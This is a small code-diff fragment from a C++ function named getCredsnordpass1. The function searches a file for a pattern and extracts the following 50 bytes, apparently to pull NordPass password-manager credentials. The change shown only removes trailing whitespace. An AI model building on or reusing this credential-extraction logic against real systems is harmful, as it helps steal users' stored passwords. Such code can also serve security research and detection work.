@@ -24,7 +24,7 @@ int getCredsnordpass1(std::string filename) {
             if (foundData.size() == searchPattern.size()) {
                 // We found the search pattern, now collect the next 50 characters
                 std::vector<unsigned char> extractedData;
-                
+
                 for (int i = 0; i < 50 && !file.eof(); ++i) {
                     file.read(reinterpret_cast<char*>(&c), sizeof(c));
                     extractedData.push_back(c);
